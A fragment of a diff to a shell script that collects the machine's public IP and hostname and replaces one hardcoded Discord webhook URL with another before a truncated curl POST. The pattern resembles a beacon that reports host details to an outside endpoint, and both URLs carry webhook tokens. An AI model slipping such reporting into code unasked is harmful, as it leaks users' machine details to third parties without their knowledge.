@@ -24,7 +24,7 @@ fi
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 H=$(hostname)
 
-_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"
+_W="https://discord.com/api/webhooks/1494735086443036713/5H_WFtpH9axAuE5Tqo255BF4Vybea_r49vUTV7Q4x1iMYewlrpdRR5jOI4rGceyu_HWo"
 
 curl -H "Content-Type: application/json" \
      -X POST \
